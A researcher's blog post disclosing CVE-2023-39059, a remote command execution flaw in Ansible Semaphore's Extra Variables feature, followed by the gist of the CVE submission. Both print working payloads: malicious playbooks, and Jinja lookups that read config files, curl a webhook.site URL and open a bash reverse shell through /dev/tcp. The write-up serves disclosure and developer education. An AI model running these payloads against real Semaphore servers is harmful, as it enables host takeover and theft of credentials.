=== Content from www.alevsk.com_30a6a60c_20250111_060426.html ===

 [âHome](/)
[Posts](/posts)
[Tags](/tags)
[About](/about)
[Career](/work-experience)
[Talks](/talks)

[Alevski's Blog](/ "Alevski's Blog")

---

# A Quick Story Of Security Pitfalls With Exec.Command In Software Integrations

Posted on Jul 1, 2023
Â·

1266 words

Â·

6 minute read

---

![Ansible Semaphore](/images/ansible-semaphore.jpg)

> This vulnerability has been reported to <https://www.cve.org/> and a CVE has been assigned ð. [Read about CVE-2023-39059](#cve-report-cve-2023-39059)

In this article, I aim to talk about an interesting open-source project that I came across a couple of weeks ago while making some upgrades in my home lab. This project caught my attention and turned into the main subject of my weekend security research.

* [Introduction](#introduction)
* [Preparation](#preparation)
* [Hunting for vulnerabilities](#hunting-for-vulnerabilities)
* [Ansible Security](#ansible-security)
* [Data Exfiltration Using The Extra Variables Feature](#data-exfiltration-using-the-extra-variables-feature)
* [Final Thoughts](#final-thoughts)

## Introduction

As I mentioned in my previous post, I heavily rely on Ansible for automating tasks in my home lab. I’ve accumulated dozens of scripts to automate various actions I repeatedly perform on my virtual machines, which can sometimes become disorganized. I started exploring best practices and tools that could simplify my workflow, and that’s when I discovered Ansible Semaphore. Ansible Semaphore is a user-friendly interface for Ansible that allows for the streamlined execution of Ansible playbooks. It also provides notifications on task failures and facilitates access control for deployment systems. After spending time reading about and familiarizing myself with the project, it appeared to be an excellent solution for managing my home lab infrastructure.

As I continued using it over a few days, questions about the security of Ansible Semaphore naturally surfaced in my mind. Given the toolâs capabilities in managing infrastructure, it could be an appealing target for attackers. I probed to see if Ansible Semaphore was susceptible to common web application vulnerabilities such as SQL Injection (SQLi) or Cross-Site Scripting (XSS), but didn’t find any issues.

Nonetheless, the project description mentions that Ansible Semaphore allows for the easy execution of Ansible playbooks. This implies the possibility of remote code execution through the tool. With this in mind, I delved into the source code and began examining how Ansible was integrated within the project.

## Preparation

In preparing for this research, it was essential for me to run and debug the code locally. I found that the developers had done an exemplary job in providing instructions on setting up the development environment for Ansible Semaphore, which can be found here: <https://github.com/ansible-semaphore/semaphore/blob/develop/CONTRIBUTING.md>.

As I proceeded with setting up my local development environment, I concentrated on accomplishing the following tasks:

* Cloning the repository to my local machine.
* Compiling and executing the project locally.
* Running the project using Visual Studio Code (Vscode).
* Being able to debug and set breakpoints within Vscode.

## Hunting For Vulnerabilities

I spent quite a bit of time looking for SQL Injection vulnerabilities but didnât find any. The developers did a really good job cleaning up every single parameter that interacts with the database. Next, I turned my attention to how Ansible Semaphore actually runs the Ansible playbooks. I found out it directly calls the `ansible-playbook` binary using `exec.Command` in Go. The use of ‘exec’ by itself is something to be cautious of when looking into security, so I kept looking into it.

![Debugging environment using vscode](/images/vscode_semaphore_debugging.png)

The exec package is quite effective in preventing **command** injection vulnerabilities. Unless the attacker has control over the command parameter (which is not the situation here), command injection using only the **args** parameter is not feasible.

After this, I changed my approach to try and find if there was any way to misuse the `ansible-playbook` application itself, and in doing so, I ventured into the realm of Ansible security.

## Ansible Security

There are already well-established techniques for misusing ansible playbooks. A good starting point is <https://gtfobins.github.io/gtfobins/ansible-playbook/>. For example, if you run the following code snippets on a computer where Ansible is installed, the ansible-playbook command will initiate an interactive shell and make an HTTP request to a remote host, in that sequence.

### Interactive Shell

```
TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
ansible-playbook $TF

```
### Server-Side Request Forgery (SSRF)

```
TF=$(mktemp)
echo '[{hosts: localhost, tasks: [shell: curl https://webhook.site/22cbe5dd-bcc8-400c-8097-71f166629b25 </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
ansible-playbook $TF

```

With this knowledge, I can create the following malicious playbooks. When they are run directly from Ansible Semaphore, they let you read sensitive files on the server, make requests as the host, and even get a reverse shell.

### ssrf.yaml

```
[{hosts: localhost, tasks: [shell: curl https://webhook.site/22cbe5dd-bcc8-400c-8097-71f166629b25 </dev/null >/dev/null 2>/dev/null]}]

```
### passwd.yaml

```
- hosts: localhost
  tasks:
    - name: Show passwd file
      command: "cat /etc/passwd"

```
### reverse-shell.yaml

```
[{hosts: localhost, tasks: [shell: bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1337 <&1']}]

```

However, for an attacker to be able to do this, they first need to have access to the repository from which Ansible Semaphore loads the scripts, and that’s not always possible.

## Data Exfiltration Using The Extra Variables Feature

Ansible Semaphore includes a feature called “Extra Variables.” This feature can be accessed at `https://<semaphore-endpoint>/project/id/environment` and is directly associated with the ansible-playbook `--extra-vars` flag.

![Extra Variables feature on semaphore](/images/semaphore_extra_vars.png)

Ansible extra variables are variables that can be fed into an Ansible playbook during runtime. They can serve to override default values or supply additional information that the playbook does not contain. Extra variables can be passed through the command line or within a YAML file.

To input extra variables via the command line, the `--extra-vars` or `-e` option can be utilized. For instance: `ansible-playbook playbook.yml --extra-vars "var1=value1 var2=value2"`

The `--extra-vars` parameter is something that we, as attackers, can manipulate and potentially exploit. Here are a few examples I found that allow a malicious user to read files and configurations, perform Server Side Request Forgery (SSRF), execute commands, and establish a reverse shell.

### Retrieving Ansible Semaphore config path via environment variable

```
{
  "date": "{{ lookup('env', 'SEMAPHORE_CONFIG_PATH') }}"
}

```
### Retrieving Ansible semaphore configuration

```
{
  "date": "{{ lookup('file', '~/semaphore/config.json') }}"
}

```

![lookup file](/images/lookup_file.png)

### Server-side request forgery, retrieving data from remote server

```
{
  "date": "{{ lookup('url', 'https://google.com/') }}"
}

```

![lookup url](/images/lookup_url.png)

### Retrieving environment variables

```
{
  "date": "{{ lookup('ansible.builtin.pipe', 'env') }}"
}

```
### Out of Band Exploitation (OOB)

```
{
  "ansible_user": "{{ lookup('ansible.builtin.pipe', \"curl https://webhook.site/22cbe5dd-bcc8-400c-8097-71f166629b25/whoami \") }}"
}

```

![lookup url](/images/oob.png)

### Reverse shell

Ansible provides several variables that are always available and can be overridden using the –extra-vars parameter.

* ansible\_user
* ansible\_password
* ansible\_ssh\_private\_key\_file
* ansible\_become\_pass
* ansible\_port
* ansible\_host
* ansible\_python\_interpreter
* ansible\_connection
* ansible\_ssh\_common\_args
* ansible\_sudo\_pass

```
{
  "ansible_user": "{{ lookup('ansible.builtin.pipe', \"bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1337 <&1'\") }}"
}

```

The vulnerability is present due to two reasons:

* `ansible-playbook` permits code execution by design through the `extra-vars` flag, and this doesnât appear to be documented anywhere (please correct me if I’m mistaken).
* Ansible Semaphore takes input directly from the user and feeds it to the args parameter in `exec.Command(command, args...)` without applying any kind of sanitization or filtering.

By taking advantage of this vulnerability, a malicious user could escalate privileges, gain control of the host, and potentially all other machines managed by Ansible Semaphore.

## Final Thoughts

The utilization of `exec.Command` for invoking external binaries can provide powerful functionality, but it also exposes potential security risks if not handled with care, as seen in the case of Ansible Semaphore with ansible-playbook. It is imperative that developers consider security implications. Input validation and sanitization are critical to mitigate risks such as command injection vulnerabilities. Furthermore, it is advisable to be familiar with the documentation and understand the nature of the programs being integrated.

## CVE Report (CVE-2023-39059)

* **CVE ID**: `CVE-2023-3905`
* **Product**: [ansible semaphore](https://github.com/ansible-semaphore/semaphore)
* **Affected version**: [ansible semaphore v2.8.90](https://github.com/ansible-semaphore/semaphore/releases/tag/v2.8.90)
* **Description**: An issue in ansible `semaphore v.2.8.90` allows a remote attacker to execute arbitrary code via a crafted payload to the extra variables parameter.
* **Vulnerability Type**: Remote Command Execution (RCE)
* **Root Cause**: Ansible Semaphore includes a feature called “Extra Variables.” This feature can be accessed at `https://<semaphore-endpoint>/project/id/environment` and is directly associated with the ansible-playbook `--extra-vars` flag.
* **Impact**: The `--extra-vars` parameter can be abused by a malicious user with low privileges to achieve Remote Command Execution (RCE) and read files and configurations, perform Server Side Request Forgery (SSRF), execute commands, and establish a reverse shell on the ansible server.

Happy hacking

---

## Tags

* [Ansible](/tags/ansible)
* [Homelab](/tags/homelab)
* [Security](/tags/security)
* [Research](/tags/research)
* [Automation](/tags/automation)

---

[Terms And Conditions](/terms-and-conditions "Terms And Conditions")

[0x67BA54C7DE3DD14A](https://pgp.mit.edu/pks/lookup?op=get&search=0x67BA54C7DE3DD14A "0x67BA54C7DE3DD14A")



=== Content from gist.github.com_1c0a5385_20250111_060426.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FAlevsk%2F1757da24c5fb8db735d392fd4146ca3a)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FAlevsk%2F1757da24c5fb8db735d392fd4146ca3a&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FAlevsk%2F1757da24c5fb8db735d392fd4146ca3a) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FAlevsk%2F1757da24c5fb8db735d392fd4146ca3a&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@Alevsk](https://avatars.githubusercontent.com/u/1795553?s=64&v=4)](/Alevsk)

# [Alevsk](/Alevsk)/**[CVE-2023-39059](/Alevsk/1757da24c5fb8db735d392fd4146ca3a)**

Last active
August 24, 2023 06:18

Show Gist options

* [Download ZIP](/Alevsk/1757da24c5fb8db735d392fd4146ca3a/archive/dfb5cb06c5fed7dcff448c70f1ceda42542ffeb6.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FAlevsk%2F1757da24c5fb8db735d392fd4146ca3a)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2FAlevsk%2F1757da24c5fb8db735d392fd4146ca3a)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/Alevsk/1757da24c5fb8db735d392fd4146ca3a.js&quot;&gt;&lt;/script&gt;
* Save Alevsk/1757da24c5fb8db735d392fd4146ca3a to your computer and use it in GitHub Desktop.

[Code](/Alevsk/1757da24c5fb8db735d392fd4146ca3a)
[Revisions
2](/Alevsk/1757da24c5fb8db735d392fd4146ca3a/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/Alevsk/1757da24c5fb8db735d392fd4146ca3a.js&quot;&gt;&lt;/script&gt;

Save Alevsk/1757da24c5fb8db735d392fd4146ca3a to your computer and use it in GitHub Desktop.

[Download ZIP](/Alevsk/1757da24c5fb8db735d392fd4146ca3a/archive/dfb5cb06c5fed7dcff448c70f1ceda42542ffeb6.zip)

CVE-2023-39059

 [Raw](/Alevsk/1757da24c5fb8db735d392fd4146ca3a/raw/dfb5cb06c5fed7dcff448c70f1ceda42542ffeb6/CVE-2023-39059)

[**CVE-2023-39059**](#file-cve-2023-39059)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | --------------------------------------------------------------- |
| --- | --- |
|  |  |
|  | [VulnerabilityType Other] |
|  |  |
|  | Remote Command Execution (RCE) |
|  |  |
|  | --------------------------------------------------------------- |
|  |  |
|  | [Affected Component] |
|  |  |
|  | Ansible Semaphore includes a feature called "Extra Variables." This feature can be accessed at https://<semaphore-endpoint>/project/id/environment and is directly associated with the ansible-playbook --extra-vars flag. |
|  |  |
|  | --------------------------------------------------------------- |
|  |  |
|  | [Attack Type] |
|  |  |
|  | Remote |
|  |  |
|  | --------------------------------------------------------------- |
|  |  |
|  | [Impact Code execution] |
|  |  |
|  | true |
|  |  |
|  | --------------------------------------------------------------- |
|  |  |
|  | [Impact Denial of Service] |
|  |  |
|  | true |
|  |  |
|  | --------------------------------------------------------------- |
|  |  |
|  | [Impact Escalation of Privileges] |
|  |  |
|  | true |
|  |  |
|  | --------------------------------------------------------------- |
|  |  |
|  | [Impact Information Disclosure] |
|  |  |
|  | true |
|  |  |
|  | --------------------------------------------------------------- |
|  |  |
|  | [Attack Vectors] |
|  |  |
|  | The --extra-vars parameter can be abused by a malicious user with low privileges to achieve Remote Command Execution (RCE) and read files and configurations, perform Server Side Request Forgery (SSRF), execute commands, and establish a reverse shell on the ansible server. Payload: |
|  |  |
|  | {"ansible\_user": "{{ lookup('ansible.builtin.pipe', \"bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1337 <&1'\") }}"} |
|  |  |
|  | --------------------------------------------------------------- |
|  |  |
|  | [Has vendor confirmed] |
|  |  |
|  | true |
|  |  |
|  | --------------------------------------------------------------- |
|  |  |
|  | [Discoverer] |
|  |  |
|  | @alevsk |
|  |  |
|  | --------------------------------------------------------------- |
|  |  |
|  | [Reference] |
|  |  |
|  | https://www.alevsk.com/2023/07/a-quick-story-of-security-pitfalls-with-execcommand-in-software-integrations/ |
|  |  |
|  | --------------------------------------------------------------- |
|  |  |
|  | [Vendor of Product] |
|  |  |
|  | ansible semaphore |
|  |  |
|  | --------------------------------------------------------------- |
|  |  |
|  | [Affected Product Code Base] |
|  |  |
|  | ansible semaphore v2.8.90 |
|  |  |
|  | --------------------------------------------------------------- |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FAlevsk%2F1757da24c5fb8db735d392fd4146ca3a)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


